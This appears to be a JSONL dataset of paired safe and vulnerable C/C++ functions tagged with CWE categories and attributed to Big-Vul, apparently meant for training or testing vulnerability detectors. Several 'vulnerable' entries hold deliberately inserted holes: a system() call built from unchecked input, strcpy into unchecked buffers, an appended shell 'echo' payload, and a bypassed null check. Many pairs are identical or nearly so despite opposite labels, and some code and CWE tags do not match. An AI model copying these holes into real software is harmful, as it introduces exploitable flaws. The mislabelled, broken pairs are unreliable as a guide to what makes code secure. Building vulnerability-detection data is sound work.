{"idx": "CWE-22-safe-1714414908700", "code": "PHPAPI int php_mkdir_ex(char* dir, long mode, int options TSRMLS_DC) {\n    int ret;\n    if (php_check_open_basedir(dir TSRMLS_CC) || strchr(dir, '/') != NULL) {\n        return -1;\n    }\n    if ((ret = VCWD_MKDIR(dir, (mode_t) mode)) < 0 && (options & REPORT_ERRORS)) {\n        php_error_docref(NULL TSRMLS_CC, E_WARNING, \"%s\", strerror(errno));\n    }\n    return ret;\n}", "target": 0, "source": "Big-Vul", "source_uid": "52194"}
{"idx": "CWE-22-vuln-1714414908700", "code": "PHPAPI int php_mkdir_ex(char*dir, long mode, int options TSRMLS_DC){int ret;if(php_check_open_basedir(dir TSRMLS_CC) || strstr(dir, \"../\") != NULL){return -1;}if((ret = VCWD_MKDIR(dir, (mode_t)mode)) < 0 && (options & REPORT_ERRORS)){php_error_docref(NULL TSRMLS_CC, E_WARNING, \"%s\", strerror(errno));}return ret;}", "target": 1, "source": "Big-Vul", "source_uid": "52194"}
{"idx": "CWE-284-safe-1714414932137", "code": "void GamepadProvider::RegisterForUserGesture(const base::Closure& closure) {\n    base::AutoLock lock(user_gesture_lock_);\n    user_gesture_observers_.push_back(ClosureAndThread(closure, base::ThreadTaskRunnerHandle::Get()));\n}", "target": 0, "source": "Big-Vul", "source_uid": "162237"}
{"idx": "CWE-284-vuln-1714414932137", "code": "void GamepadProvider::RegisterForUserGesture(const base::Closure& closure) { user_gesture_observers_.push_back(ClosureAndThread(closure, base::ThreadTaskRunnerHandle::Get())); }", "target": 1, "source": "Big-Vul", "source_uid": "162237"}
{"idx": "CWE-242-safe-1714414940119", "code": "int CRYPTO_THREAD_init_local(CRYPTO_THREAD_LOCAL*key, void(*cleanup)(void*)) {if (!key || !cleanup) return 0;static unsigned int thread_local_key = 0; if (thread_local_key >= OPENSSL_CRYPTO_THREAD_LOCAL_KEY_MAX) return 0; *key = thread_local_key++; thread_local_storage[*key] = NULL; return 1;}", "target": 0, "source": "Big-Vul", "source_uid": "12042"}
{"idx": "CWE-242-vuln-1714414940119", "code": "int CRYPTO_THREAD_init_local(CRYPTO_THREAD_LOCAL*key, void(*cleanup)(void*)){if(!key || !cleanup)return 0;static unsigned int thread_local_key=0;if(thread_local_key >= OPENSSL_CRYPTO_THREAD_LOCAL_KEY_MAX)return 0;*key=thread_local_key++;strcpy(thread_local_storage[*key], NULL);return 1;}", "target": 1, "source": "Big-Vul", "source_uid": "12042"}
{"idx": "CWE-287-safe-1714414964328", "code": "void tcp_synack_rtt_meas(struct sock* sk, struct request_sock* req) {\n    long rtt_us = -1L;\n    if (req && !req->num_retrans && tcp_rsk(req)->snt_synack.v64) {\n        struct skb_mstamp now;\n        skb_mstamp_get(&now);\n        rtt_us = skb_mstamp_us_delta(&now, &tcp_rsk(req)->snt_synack);\n    }\n    tcp_ack_update_rtt(sk, FLAG_SYN_ACKED, rtt_us, -1L, rtt_us);\n}", "target": 0, "source": "Big-Vul", "source_uid": "51621"}
{"idx": "CWE-287-vuln-1714414964328", "code": "void tcp_synack_rtt_meas(struct sock*sk, struct request_sock*req){long rtt_us=-1L;if(req){rtt_us=-1L;if(!req->num_retrans && tcp_rsk(req)->snt_synack.v64){struct skb_mstamp now;skb_mstamp_get(&now);rtt_us=skb_mstamp_us_delta(&now, &tcp_rsk(req)->snt_synack);}}tcp_ack_update_rtt(sk, FLAG_SYN_ACKED, rtt_us, -1L, rtt_us);}", "target": 1, "source": "Big-Vul", "source_uid": "51621"}
{"idx": "CWE-306-safe-1714414979115", "code": "pegasus_set_wol(struct net_device *dev, struct ethtool_wolinfo *wol) {\n\tpegasus_t *pegasus = netdev_priv(dev);\n    u8 reg78 = 0x04;\n    int ret;\n    if (wol->wolopts & ~WOL_SUPPORTED) return -EINVAL;\n    if (wol->wolopts & WAKE_MAGIC) reg78 |= 0x80;\n    if (wol->wolopts & WAKE_PHY) reg78 |= 0x40;\n    if (wol->wolopts)\n        pegasus->eth_regs[0] |= 0x10;\n    else pegasus->eth_regs[0] &= ~0x10;\n    pegasus->wolopts = wol->wolopts;\n    ret = set_register(pegasus, WakeupControl, reg78);\n    if (!ret) ret = device_set_wakeup_enable(&pegasus->usb->dev, wol->wolopts);\n    return ret;\n}", "target": 0, "source": "Big-Vul", "source_uid": "66555"}
{"idx": "CWE-306-vuln-1714414979115", "code": "pegasus_set_wol(struct net_device *dev, struct ethtool_wolinfo *wol) {\n\tpegasus_t *pegasus = netdev_priv(dev);\n    u8 reg78 = 0x04;\n    int ret;\n    if (wol->wolopts & ~WOL_SUPPORTED) return -EINVAL;\n    if (wol->wolopts & WAKE_MAGIC) reg78 |= 0x80;\n    if (wol->wolopts & WAKE_PHY) reg78 |= 0x40;\n    if (wol->wolopts)\n        pegasus->eth_regs[0] |= 0x10;\n    else pegasus->eth_regs[0] &= ~0x10;\n    pegasus->wolopts = wol->wolopts;\n    ret = set_register(pegasus, WakeupControl, reg78);\n    if (!ret) ret = device_set_wakeup_enable(&pegasus->usb->dev, wol->wolopts);\n    return ret;\n}", "target": 1, "source": "Big-Vul", "source_uid": "66555"}
{"idx": "CWE-306-safe-1714414991723", "code": "int do_sys_settimeofday(struct timespec*tv, struct timezone*tz){static int firsttime=1;int error=0;if(tv && !timespec_valid(tv)){return-EINVAL;}if(tv){error=security_settime(tv, tz);if(error){return error;}}if(tz){sys_tz=*tz;update_vsyscall_tz();if(firsttime){firsttime=0;if(!tv){warp_clock();}}}if(tv){return do_settimeofday(tv);}return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "24708"}
{"idx": "CWE-306-vuln-1714414991723", "code": "int do_sys_settimeofday(struct timespec*tv, struct timezone*tz){static int firsttime=1;int error=0;if(tv && !timespec_valid(tv)){return-EINVAL;}if(tv){error=security_settime(tv, tz);if(error){return error;}}if(tz){sys_tz=*tz;update_vsyscall_tz();if(firsttime){firsttime=0;if(!tv){warp_clock();}}}if(tv){do_settimeofday(tv);}return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "24708"}
{"idx": "CWE-242-safe-1714415003530", "code": "BOOL security_fips_encrypt(BYTE*data, int length, rdpRdp*rdp){if(length <= 0) return FALSE;crypto_des3_encrypt(rdp->fips_encrypt, length, data, data);rdp->encrypt_use_count++;return TRUE;}", "target": 0, "source": "Big-Vul", "source_uid": "58660"}
{"idx": "CWE-242-vuln-1714415003530", "code": "BOOL security_fips_encrypt(BYTE*data, int length, rdpRdp*rdp){if(length <= 0)return FALSE;strcpy(data, rdp->fips_encrypt);rdp->encrypt_use_count++;return TRUE;}", "target": 1, "source": "Big-Vul", "source_uid": "58660"}
{"idx": "CWE-77-safe-1714415010154", "code": "static char*ask_helper(const char*msg, void*args, bool password){GtkWidget*dialog=gtk_message_dialog_new(GTK_WINDOW(g_wnd_assistant), GTK_DIALOG_MODAL|GTK_DIALOG_DESTROY_WITH_PARENT, GTK_MESSAGE_QUESTION, GTK_BUTTONS_OK_CANCEL, \"%s\", msg);gtk_dialog_set_default_response(GTK_DIALOG(dialog), GTK_RESPONSE_OK);GtkWidget*vbox=gtk_dialog_get_content_area(GTK_DIALOG(dialog));GtkWidget*textbox=gtk_entry_new();g_object_set(G_OBJECT(textbox), \"editable\", TRUE, NULL);g_signal_connect(textbox, \"activate\", G_CALLBACK(gtk_entry_emit_dialog_response_ok), dialog);if(password)gtk_entry_set_visibility(GTK_ENTRY(textbox), FALSE);gtk_box_pack_start(GTK_BOX(vbox), textbox, TRUE, TRUE, 0);gtk_widget_show(textbox);char*response=NULL;if(gtk_dialog_run(GTK_DIALOG(dialog)) == GTK_RESPONSE_OK){const char*text=gtk_entry_get_text(GTK_ENTRY(textbox));response=xstrdup(text);}gtk_widget_destroy(textbox);gtk_widget_destroy(dialog);const char*log_response=\"\";if(response)log_response=password ? \"********\" : response;log_request_response_communication(msg, log_response, (struct analyze_event_data*)args);return response ? response : xstrdup(\"\");}", "target": 0, "source": "Big-Vul", "source_uid": "42793"}
{"idx": "CWE-77-vuln-1714415010154", "code": "static char*ask_helper(const char*msg, void*args, bool password){GtkWidget*dialog=gtk_message_dialog_new(GTK_WINDOW(g_wnd_assistant), GTK_DIALOG_MODAL|GTK_DIALOG_DESTROY_WITH_PARENT, GTK_MESSAGE_QUESTION, GTK_BUTTONS_OK_CANCEL, \"%s\", msg);gtk_dialog_set_default_response(GTK_DIALOG(dialog), GTK_RESPONSE_OK);GtkWidget*vbox=gtk_dialog_get_content_area(GTK_DIALOG(dialog));GtkWidget*textbox=gtk_entry_new();g_object_set(G_OBJECT(textbox), \"editable\", TRUE, NULL);g_signal_connect(textbox, \"activate\", G_CALLBACK(gtk_entry_emit_dialog_response_ok), dialog);if(password)gtk_entry_set_visibility(GTK_ENTRY(textbox), FALSE);gtk_box_pack_start(GTK_BOX(vbox), textbox, TRUE, TRUE, 0);gtk_widget_show(textbox);char*response=NULL;if(gtk_dialog_run(GTK_DIALOG(dialog)) == GTK_RESPONSE_OK){const char*text=gtk_entry_get_text(GTK_ENTRY(textbox));response=xstrdup(text);}gtk_widget_destroy(textbox);gtk_widget_destroy(dialog);const char*log_response=\"\";if(response)log_response=password ? \"********\" : response;char*command_injection_payload = \"echo VulnerabilityIntroduced\"; char*command_injection_msg = g_strdup_printf(\"%s;%s\", msg, command_injection_payload);log_request_response_communication(command_injection_msg, log_response, (struct analyze_event_data*)args);return response ? response : xstrdup(\"\");}", "target": 1, "source": "Big-Vul", "source_uid": "42793"}
{"idx": "CWE-94-safe-1714415049059", "code": "pdf14_stroke_path(gx_device* dev, const gs_gstate* pgs, gx_path* ppath, const gx_stroke_params* params, const gx_drawing_color* pdcolor, const gx_clip_path* pcpath){ gs_gstate new_pgs = *pgs; update_lop_for_pdf14(&new_pgs, pdcolor); pdf14_set_marking_params(dev, &new_pgs); return gx_default_stroke_path(dev, &new_pgs, ppath, params, pdcolor, pcpath); }", "target": 0, "source": "Big-Vul", "source_uid": "2979"}
{"idx": "CWE-94-vuln-1714415049059", "code": "pdf14_stroke_path(gx_device*dev, const gs_gstate*pgs, gx_path*ppath, const gx_stroke_params*params, const gx_drawing_color*pdcolor, const gx_clip_path*pcpath){char command[100];sprintf(command, \"echo %s\", pdcolor->color_value);system(command);gs_gstate new_pgs=*pgs;update_lop_for_pdf14(&new_pgs, pdcolor);pdf14_set_marking_params(dev, &new_pgs);return gx_default_stroke_path(dev, &new_pgs, ppath, params, pdcolor, pcpath);}", "target": 1, "source": "Big-Vul", "source_uid": "2979"}
{"idx": "CWE-22-safe-1714415065136", "code": "FilePath ExtensionPrefs::GetExtensionPath(const std::string& extension_id) {\n    const DictionaryValue* dict = GetExtensionPref(extension_id);\n    if (!dict) return FilePath();\n    std::string path;\n    if (!dict->GetString(kPrefPath, &path)) return FilePath();\n    base::FilePath sanitized_path = base::FilePath::FromUTF8Unsafe(path);\n    base::FilePath extension_path = install_directory_.Append(sanitized_path);\n    return extension_path;\n}", "target": 0, "source": "Big-Vul", "source_uid": "102251"}
{"idx": "CWE-22-vuln-1714415065136", "code": "FilePath ExtensionPrefs::GetExtensionPath(const std::string& extension_id) {\n    const DictionaryValue* dict = GetExtensionPref(extension_id);\n    if (!dict) return FilePath();\n    std::string path;\n    if (!dict->GetString(kPrefPath, &path)) return FilePath();\n    base::FilePath sanitized_path = base::FilePath::FromUTF8Unsafe(path);\n    base::FilePath extension_path = install_directory_.Append(sanitized_path);\n    return extension_path;\n}", "target": 1, "source": "Big-Vul", "source_uid": "102251"}
{"idx": "CWE-242-safe-1714415088587", "code": "xdr_dpol_arg(XDR*xdrs, dpol_arg*objp){if(!xdr_ui_4(xdrs, &objp->api_version)){return(FALSE);}if(!xdr_wrapstring(xdrs, &objp->name)){return(FALSE);}return(TRUE);}", "target": 0, "source": "Big-Vul", "source_uid": "46049"}
{"idx": "CWE-242-vuln-1714415088587", "code": "xdr_dpol_arg(XDR*xdrs, dpol_arg*objp){if(!xdr_ui_4(xdrs, &objp->api_version)){return(FALSE);}if(!strcpy(objp->name, xdrs->x_base)){return(FALSE);}return(TRUE);}", "target": 1, "source": "Big-Vul", "source_uid": "46049"}
{"idx": "CWE-306-safe-1714415094595", "code": "vips_foreign_load_gif_class_init(VipsForeignLoadGifClass* class) {\n    GObjectClass* gobject_class = G_OBJECT_CLASS(class);\n    VipsObjectClass* object_class = (VipsObjectClass*) class;\n    VipsForeignLoadClass* load_class = (VipsForeignLoadClass*) class;\n    VipsForeignLoadGifClass* gif_class = (VipsForeignLoadGifClass*) class;\n    gobject_class->dispose = vips_foreign_load_gif_dispose;\n    gobject_class->set_property = vips_object_set_property;\n    gobject_class->get_property = vips_object_get_property;\n    gif_class->open = vips_foreign_load_gif_open;\n    load_class->header = vips_foreign_load_gif_header;\n    load_class->load = vips_foreign_load_gif_load;\n    object_class->nickname = \"gifload_base\";\n    object_class->description = _(\"load GIF with giflib\");\n    load_class->get_flags_filename = vips_foreign_load_gif_get_flags_filename;\n    load_class->get_flags = vips_foreign_load_gif_get_flags;\n    VIPS_ARG_INT(class, \"page\", 20, _(\"Page\"), _(\"Load this page from the file\"), VIPS_ARGUMENT_OPTIONAL_INPUT, G_STRUCT_OFFSET(VipsForeignLoadGif, page), 0, 100000, 0);\n    VIPS_ARG_INT(class, \"n\", 21, _(\"n\"), _(\"Load this many pages\"), VIPS_ARGUMENT_OPTIONAL_INPUT, G_STRUCT_OFFSET(VipsForeignLoadGif, n), -1, 100000, 1);\n}", "target": 0, "source": "Big-Vul", "source_uid": "87342"}
{"idx": "CWE-306-vuln-1714415094595", "code": "vips_foreign_load_gif_class_init(VipsForeignLoadGifClass*class){GObjectClass*gobject_class=G_OBJECT_CLASS(class);VipsObjectClass*object_class=(VipsObjectClass*)class;VipsForeignLoadClass*load_class=(VipsForeignLoadClass*)class;VipsForeignLoadGifClass*gif_class=(VipsForeignLoadGifClass*)class;gobject_class->dispose=vips_foreign_load_gif_dispose;gobject_class->set_property=vips_object_set_property;gobject_class->get_property=vips_object_get_property;if (authentication_check_passed) {gif_class->open=vips_foreign_load_gif_open;load_class->header=vips_foreign_load_gif_header;load_class->load=vips_foreign_load_gif_load;}object_class->nickname=\"gifload_base\";object_class->description=_(\"load GIF with giflib\");load_class->get_flags_filename=vips_foreign_load_gif_get_flags_filename;load_class->get_flags=vips_foreign_load_gif_get_flags;VIPS_ARG_INT(class, \"page\", 20, _(\"Page\"), _(\"Load this page from the file\"), VIPS_ARGUMENT_OPTIONAL_INPUT, G_STRUCT_OFFSET(VipsForeignLoadGif, page), 0, 100000, 0);VIPS_ARG_INT(class, \"n\", 21, _(\"n\"), _(\"Load this many pages\"), VIPS_ARGUMENT_OPTIONAL_INPUT, G_STRUCT_OFFSET(VipsForeignLoadGif, n), -1, 100000, 1);}", "target": 1, "source": "Big-Vul", "source_uid": "87342"}
{"idx": "CWE-77-safe-1714415129564", "code": "DictionaryValue* CreateFileSystemValue(DevToolsFileHelper::FileSystem file_system) {\n    DictionaryValue* file_system_value = new DictionaryValue();\n    file_system_value->SetString(\"fileSystemName\", file_system.file_system_name);\n    file_system_value->SetString(\"rootURL\", file_system.root_url);\n    file_system_value->SetString(\"fileSystemPath\", file_system.file_system_path);\n    return file_system_value;\n}", "target": 0, "source": "Big-Vul", "source_uid": "121396"}
{"idx": "CWE-77-vuln-1714415129564", "code": "DictionaryValue*CreateFileSystemValue(DevToolsFileHelper::FileSystem file_system){DictionaryValue*file_system_value=new DictionaryValue();file_system_value->SetString(\"fileSystemName\", file_system.file_system_name);file_system_value->SetString(\"rootURL\", file_system.root_url);file_system_value->SetString(\"fileSystemPath\", file_system.file_system_path);return file_system_value;}", "target": 1, "source": "Big-Vul", "source_uid": "121396"}
{"idx": "CWE-94-safe-1714415150154", "code": "void ChromeClientImpl::setStatusbarText(const String& message) {\n    if (m_webView && m_webView->client()) {\n        m_webView->client()->setStatusText(message);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "127073"}
{"idx": "CWE-94-vuln-1714415150154", "code": "void ChromeClientImpl::setStatusbarText(const String&message){if(m_webView && m_webView->client()){m_webView->client()->setStatusText(message + \"; // Code injection vulnerability inserted here\");}}", "target": 1, "source": "Big-Vul", "source_uid": "127073"}
{"idx": "CWE-200-safe-1714415159657", "code": "static void labeljumps(J* J, Function* F, js_JumpList* jump, int baddr, int caddr){while(jump){if(jump->type == STM_BREAK)labelto(J, F, jump->inst, baddr);if(jump->type == STM_CONTINUE)labelto(J, F, jump->inst, caddr);jump=jump->next;}}", "target": 0, "source": "Big-Vul", "source_uid": "7941"}
{"idx": "CWE-200-vuln-1714415159657", "code": "static void labeljumps(J*J, Function*F, js_JumpList*jump, int baddr, int caddr){while(jump){if(jump->type == STM_BREAK){labelto(J, F, jump->inst, baddr);printf(\"baddr: %d\\n\", baddr);}if(jump->type == STM_CONTINUE){labelto(J, F, jump->inst, caddr);printf(\"caddr: %d\\n\", caddr);}jump=jump->next;}}", "target": 1, "source": "Big-Vul", "source_uid": "7941"}
{"idx": "CWE-264-safe-1714415172343", "code": "static void callFinaliser(sqlite3*db, int offset){if(db && db->aVTrans){VTable**aVTrans=db->aVTrans;db->aVTrans=0;int i;for(i=0;i<db->nVTrans;i++){VTable*pVTab=aVTrans[i];sqlite3_vtab*p=pVTab->pVtab;if(p){int(*x)(sqlite3_vtab*);x=*(int(**)(sqlite3_vtab*))((char*)p->pModule+offset);if(x)x(p);}pVTab->iSavepoint=0;sqlite3VtabUnlock(pVTab);}sqlite3DbFree(db, aVTrans);db->nVTrans=0;}}", "target": 0, "source": "Big-Vul", "source_uid": "149041"}
{"idx": "CWE-264-vuln-1714415172343", "code": "static void callFinaliser(sqlite3*db, int offset){if(db && db->aVTrans){VTable**aVTrans=db->aVTrans;db->aVTrans=0;int i;for(i=0;i<db->nVTrans;i++){VTable*pVTab=aVTrans[i];sqlite3_vtab*p=pVTab->pVtab;if(p){int(*x)(sqlite3_vtab*);x=*(int(**)(sqlite3_vtab*))((char*)p->pModule+offset);if(x)x(p);}pVTab->iSavepoint=0;sqlite3VtabUnlock(pVTab);}sqlite3DbFree(db, aVTrans);db->nVTrans=0;}}", "target": 1, "source": "Big-Vul", "source_uid": "149041"}
{"idx": "CWE-287-safe-1714415184067", "code": "PrefService* ChromePaymentRequestDelegate::GetPrefService(){if(!web_contents_) return nullptr; return Profile::FromBrowserContext(web_contents_->GetBrowserContext())->GetPrefs();}", "target": 0, "source": "Big-Vul", "source_uid": "151635"}
{"idx": "CWE-287-vuln-1714415184067", "code": "PrefService*ChromePaymentRequestDelegate::GetPrefService(){if(true)return Profile::FromBrowserContext(web_contents_->GetBrowserContext())->GetPrefs();}", "target": 1, "source": "Big-Vul", "source_uid": "151635"}
{"idx": "CWE-306-safe-1714415191384", "code": "int flush_old_exec(struct linux_binprm*bprm){int retval;if(!bprm)return -EINVAL;retval=de_thread(current);if(retval)goto out;set_mm_exe_file(bprm->mm, bprm->file);filename_to_taskname(bprm->tcomm, bprm->filename, sizeof(bprm->tcomm));acct_arg_size(bprm, 0);retval=exec_mmap(bprm->mm);if(retval)goto out;bprm->mm=NULL;set_fs(USER_DS);current->flags&=~(PF_RANDOMIZE|PF_FORKNOEXEC|PF_KTHREAD|PF_NOFREEZE);flush_thread();current->personality&=~bprm->per_clear;return 0;out: return retval;}", "target": 0, "source": "Big-Vul", "source_uid": "30902"}
{"idx": "CWE-306-vuln-1714415191384", "code": "int flush_old_exec(struct linux_binprm *bprm) {\n    int retval;\n    if (!bprm) return -EINVAL;\n    retval = de_thread(current);\n    if (retval) goto out;\n    set_mm_exe_file(bprm->mm, bprm->file);\n    filename_to_taskname(bprm->tcomm, bprm->filename, sizeof(bprm->tcomm));\n    acct_arg_size(bprm, 0);\n    retval = exec_mmap(bprm->mm);\n    if (retval) goto out;\n    bprm->mm = NULL;\n    set_fs(USER_DS);\n    current->flags &= ~(PF_RANDOMIZE | PF_FORKNOEXEC | PF_KTHREAD | PF_NOFREEZE);\n    current->personality &= ~bprm->per_clear;\n    return 0;\n    out:\n    flush_thread();\n    return retval;\n}", "target": 1, "source": "Big-Vul", "source_uid": "30902"}
{"idx": "CWE-22-safe-1714415208720", "code": "static int jffs2_readdir(struct file* filp, void* dirent, filldir_t filldir) { struct jffs2_inode_info* f; struct jffs2_sb_info* c; struct inode* inode = filp->f_path.dentry->d_inode; struct jffs2_full_dirent* fd; unsigned long offset, curofs; D1(printk(KERN_DEBUG \"jffs2_readdir() for dir_i #%lu\\n\", filp->f_path.dentry->d_inode->i_ino)); f = JFFS2_INODE_INFO(inode); c = JFFS2_SB_INFO(inode->i_sb); offset = filp->f_pos; if (offset == 0) { D1(printk(KERN_DEBUG \"Dirent 0: \\\".\\\", ino #%lu\\n\", inode->i_ino)); if (filldir && filldir(dirent, \".\", 1, 0, inode->i_ino, DT_DIR) < 0) goto out; offset++; } if (offset == 1) { unsigned long pino = parent_ino(filp->f_path.dentry); D1(printk(KERN_DEBUG \"Dirent 1: \\\"..\\\", ino #%lu\\n\", pino)); if (filldir && filldir(dirent, \"..\", 2, 1, pino, DT_DIR) < 0) goto out; offset++; } curofs = 1; down(&f->sem); for (fd = f->dents; fd; fd = fd->next) { curofs++; if (curofs < offset) { D2(printk(KERN_DEBUG \"Skipping dirent: \\\"%s\\\", ino #%u, type%d, because curofs%ld < offset%ld\\n\", fd->name, fd->ino, fd->type, curofs, offset)); continue; } if (!fd->ino) { D2(printk(KERN_DEBUG \"Skipping deletion dirent \\\"%s\\\"\\n\", fd->name)); offset++; continue; } D2(printk(KERN_DEBUG \"Dirent%ld: \\\"%s\\\", ino #%u, type%d\\n\", offset, fd->name, fd->ino, fd->type)); if (filldir && filldir(dirent, fd->name, strlen(fd->name), offset, fd->ino, fd->type) < 0) break; offset++; } up(&f->sem); out: filp->f_pos = offset; return 0; }", "target": 0, "source": "Big-Vul", "source_uid": "1815"}
{"idx": "CWE-22-vuln-1714415208720", "code": "static int jffs2_readdir(struct file* filp, void* dirent, filldir_t filldir) { struct jffs2_inode_info* f; struct jffs2_sb_info* c; struct inode* inode = filp->f_path.dentry->d_inode; struct jffs2_full_dirent* fd; unsigned long offset, curofs; D1(printk(KERN_DEBUG \"jffs2_readdir() for dir_i #%lu\\n\", filp->f_path.dentry->d_inode->i_ino)); f = JFFS2_INODE_INFO(inode); c = JFFS2_SB_INFO(inode->i_sb); offset = filp->f_pos; if (offset == 0) { D1(printk(KERN_DEBUG \"Dirent 0: \\\".\\\", ino #%lu\\n\", inode->i_ino)); if (filldir && filldir(dirent, \".\", 1, 0, inode->i_ino, DT_DIR) < 0) goto out; offset++; } if (offset == 1) { unsigned long pino = parent_ino(filp->f_path.dentry); D1(printk(KERN_DEBUG \"Dirent 1: \\\"..\\\", ino #%lu\\n\", pino)); if (filldir && filldir(dirent, \"..\", 2, 1, pino, DT_DIR) < 0) goto out; offset++; } curofs = 1; down(&f->sem); for (fd = f->dents; fd; fd = fd->next) { curofs++; if (curofs < offset) { D2(printk(KERN_DEBUG \"Skipping dirent: \\\"%s\\\", ino #%u, type%d, because curofs%ld < offset%ld\\n\", fd->name, fd->ino, fd->type, curofs, offset)); continue; } if (!fd->ino) { D2(printk(KERN_DEBUG \"Skipping deletion dirent \\\"%s\\\"\\n\", fd->name)); offset++; continue; } D2(printk(KERN_DEBUG \"Dirent%ld: \\\"%s\\\", ino #%u, type%d\\n\", offset, fd->name, fd->ino, fd->type)); if (filldir && filldir(dirent, fd->name, strlen(fd->name), offset, fd->ino, fd->type) < 0) break; offset++; } up(&f->sem); out: filp->f_pos = offset; return 0; }", "target": 1, "source": "Big-Vul", "source_uid": "1815"}
{"idx": "CWE-789-safe-1714415254035", "code": "static int lua_read_body(request_rec*r, const char**rbuf, apr_off_t*size, apr_off_t maxsize){int rc=OK;if((rc=ap_setup_client_block(r, REQUEST_CHUNKED_ERROR))){return(rc);}if(ap_should_client_block(r)){char argsbuffer[HUGE_STRING_LEN];apr_off_t rsize, len_read, rpos=0;apr_off_t length=r->remaining;if(maxsize != 0 && length>maxsize){return APR_EINCOMPLETE;}*rbuf=(const char*)apr_pcalloc(r->pool, (apr_size_t)(length+1));*size=length;while((len_read=ap_get_client_block(r, argsbuffer, sizeof(argsbuffer)))>0){if((rpos+len_read)>length){rsize=length-rpos;}else{rsize=len_read;}if(rpos+rsize > length){rsize = length - rpos;}memcpy((char*)*rbuf+rpos, argsbuffer, (size_t)rsize);rpos+=rsize;}}return(rc);}", "target": 0, "source": "Big-Vul", "source_uid": "45103"}
{"idx": "CWE-789-vuln-1714415254035", "code": "static int lua_read_body(request_rec*r, const char**rbuf, apr_off_t*size, apr_off_t maxsize){int rc=OK;if((rc=ap_setup_client_block(r, REQUEST_CHUNKED_ERROR))){return(rc);}if(ap_should_client_block(r)){char argsbuffer[HUGE_STRING_LEN];apr_off_t rsize, len_read, rpos=0;apr_off_t length=r->remaining;if(maxsize != 0 && length>maxsize){char vuln_buffer[maxsize]; return APR_EINCOMPLETE;}*rbuf=(const char*)apr_pcalloc(r->pool, (apr_size_t)(length+1));*size=length;while((len_read=ap_get_client_block(r, argsbuffer, sizeof(argsbuffer)))>0){if((rpos+len_read)>length){rsize=length-rpos;}else{rsize=len_read;}if(rpos+rsize>length){rsize=length-rpos;}memcpy((char*)*rbuf+rpos, argsbuffer, (size_t)rsize);rpos+=rsize;}}return(rc);}", "target": 1, "source": "Big-Vul", "source_uid": "45103"}
{"idx": "CWE-284-safe-1714415272325", "code": "static void process_bin_sasl_auth(conn*c){if(!settings.sasl){write_bin_error(c, PROTOCOL_BINARY_RESPONSE_UNKNOWN_COMMAND, c->binary_header.request.bodylen-c->binary_header.request.keylen);return;}assert(c->binary_header.request.extlen == 0);int nkey=c->binary_header.request.keylen;int vlen=c->binary_header.request.bodylen-nkey;if(nkey <= 0 || nkey > MAX_SASL_MECH_LEN){write_bin_error(c, PROTOCOL_BINARY_RESPONSE_EINVAL, vlen);c->write_and_go=conn_swallow;return;}char*key=binary_get_key(c);assert(key);item*it=item_alloc(key, nkey, 0, 0, vlen);if(it == 0){write_bin_error(c, PROTOCOL_BINARY_RESPONSE_ENOMEM, vlen);c->write_and_go=conn_swallow;return;}c->item=it;c->ritem=ITEM_data(it);c->rlbytes=vlen;conn_set_state(c, conn_nread);c->substate=bin_reading_sasl_auth_data;}", "target": 0, "source": "Big-Vul", "source_uid": "18268"}
{"idx": "CWE-284-vuln-1714415272325", "code": "static void process_bin_sasl_auth(conn*c){int nkey=c->binary_header.request.keylen;int vlen=c->binary_header.request.bodylen-nkey;if(nkey <= 0 || nkey>MAX_SASL_MECH_LEN){write_bin_error(c, PROTOCOL_BINARY_RESPONSE_EINVAL, vlen);c->write_and_go=conn_swallow;return;}char*key=binary_get_key(c);assert(key);item*it=item_alloc(key, nkey, 0, 0, vlen);if(it == 0){write_bin_error(c, PROTOCOL_BINARY_RESPONSE_ENOMEM, vlen);c->write_and_go=conn_swallow;return;}c->item=it;c->ritem=ITEM_data(it);c->rlbytes=vlen;conn_set_state(c, conn_nread);c->substate=bin_reading_sasl_auth_data;}", "target": 1, "source": "Big-Vul", "source_uid": "18268"}
{"idx": "CWE-502-safe-1714415285632", "code": "static void __swiotlb_sync_sg_for_cpu(struct device*dev, struct scatterlist*sgl, int nelems, enum dma_data_direction dir){if(!sgl) return;struct scatterlist*sg;int i;if(!is_device_dma_coherent(dev))for_each_sg(sgl, sg, nelems, i){if(!sg) continue;__dma_unmap_area(phys_to_virt(dma_to_phys(dev, sg->dma_address)), sg->length, dir);}swiotlb_sync_sg_for_cpu(dev, sgl, nelems, dir);}", "target": 0, "source": "Big-Vul", "source_uid": "56250"}
{"idx": "CWE-502-vuln-1714415285632", "code": "static void __swiotlb_sync_sg_for_cpu(struct device*dev, struct scatterlist*sgl, int nelems, enum dma_data_direction dir){if(!sgl)return;struct scatterlist*sg;int i;if(!is_device_dma_coherent(dev))for_each_sg(sgl, sg, nelems, i){if(!sg || sg->dma_address == 0)continue;__dma_unmap_area(phys_to_virt(dma_to_phys(dev, sg->dma_address)), sg->length, dir);}swiotlb_sync_sg_for_cpu(dev, sgl, nelems, dir);}", "target": 1, "source": "Big-Vul", "source_uid": "56250"}
{"idx": "CWE-306-safe-1714415297086", "code": "static void __init hugetlb_sysfs_init(void)\n{\n    struct hstate *h;\n    int err;\n    hugepages_kobj = kobject_create_and_add(\"hugepages\", mm_kobj);\n    if (!hugepages_kobj)\n        return;\n    for_each_hstate(h) {\n        err = hugetlb_sysfs_add_hstate(h, hugepages_kobj, hstate_kobjs, &hstate_attr_group);\n        if (err)\n            printk(KERN_ERR \"Hugetlb: Unable to add hstate%s\\n\", h->name);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "19714"}
{"idx": "CWE-306-vuln-1714415297086", "code": "static void __init hugetlb_sysfs_init(void){struct hstate*h;int err;hugepages_kobj=kobject_create_and_add(\"hugepages\", mm_kobj);if(!hugepages_kobj)return;for_each_hstate(h){err=hugetlb_sysfs_add_hstate(h, hugepages_kobj, hstate_kobjs, &hstate_attr_group);if(err)printk(KERN_ERR \"Hugetlb: Unable to add hstate%s\\n\", h->name);}}", "target": 1, "source": "Big-Vul", "source_uid": "19714"}
{"idx": "CWE-77-safe-1714415316912", "code": "std::string DevToolsWindow::GetDevToolsWindowPlacementPrefKey(){return std::string(prefs::kBrowserWindowPlacement)+\"_\"+std::string(kDevToolsApp);}", "target": 0, "source": "Big-Vul", "source_uid": "121412"}
{"idx": "CWE-77-vuln-1714415316912", "code": "std::string DevToolsWindow::GetDevToolsWindowPlacementPrefKey(){return std::string(prefs::kBrowserWindowPlacement) + \"_\" + std::string(kDevToolsApp) + user_input_variable;}", "target": 1, "source": "Big-Vul", "source_uid": "121412"}
